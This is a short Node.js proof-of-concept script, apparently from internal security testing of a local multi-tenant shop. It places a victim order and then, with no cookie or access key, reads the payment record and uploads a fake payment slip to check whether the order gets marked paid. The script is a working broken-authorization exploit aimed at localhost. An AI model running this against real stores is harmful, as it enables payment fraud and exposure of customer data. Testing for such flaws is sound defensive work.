import { readFileSync } from "node:fs";
import { WEB, db } from "./security-http.mjs";
const sql = db();
// make a fresh pending order+payment on sec-u1shop and confirm an ANONYMOUS slip POST (no cookie, no access key) marks it paid
const host = "sec-u1shop.localhost:3000";
const [t] = await sql`select id from tenants where slug='sec-u1shop'`;
const [p] = await sql`select id from products where tenant_id=${t.id} and status='active' and has_variants=false order by created_at limit 1`;
const [m] = await sql`select id from shipping_methods where tenant_id=${t.id} and active=true order by type='pickup' desc limit 1`;
const add = await fetch(`${WEB}/api/cart`, { method: "POST", headers: { "x-forwarded-host": host, "content-type": "application/json" }, body: JSON.stringify({ productId: p.id, quantity: 1 }) });
const cartCookie = (add.headers.getSetCookie() ?? []).map((c) => c.split(";")[0]).join("; ");
const { actionId, callWebAction } = await import("./security-http.mjs");
const form = { name: "Victim", phone: "0890001111", email: "", shippingMethodId: m.id, paymentMethod: "slip", note: "", line1: "x", subdistrict: "x", district: "x", province: "กรุงเทพมหานคร", postalCode: "10110" };
const o = await callWebAction(host, cartCookie, actionId("placeOrderAction", "checkout"), [t.id, {}, "$K1"], "/checkout", form);
const orderId = o.location?.match(/\/orders\/([0-9a-f-]{36})/)?.[1];
const [pay] = await sql`select id, status from payments where tenant_id=${t.id} and ref_id=${orderId} order by created_at desc limit 1`;
console.log("victim order", orderId, "payment", pay);
// attacker: status route with just paymentId (no cookie/accessKey)
const st = await fetch(`${WEB}/api/payments/${pay.id}`, { headers: { "x-forwarded-host": host } });
console.log("GET /api/payments/<id> (anon):", st.status, JSON.stringify(await st.json()));
// attacker: upload a slip (1x1 png) with NO cookie and NO access key
const png = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000002000154a24f3e0000000049454e44ae426082", "hex");
const fd = new FormData(); fd.append("slip", new Blob([png], { type: "image/png" }), "s.png");
const up = await fetch(`${WEB}/api/payments/${pay.id}/slip`, { method: "POST", headers: { "x-forwarded-host": host }, body: fd });
console.log("POST slip (anon, no access key):", up.status, JSON.stringify(await up.json()));
console.log("payment after:", (await sql`select status, verified_by from payments where id=${pay.id}`)[0]);
console.log("order after:", (await sql`select status, payment_status from orders where id=${orderId}`)[0]);
process.exit(0);
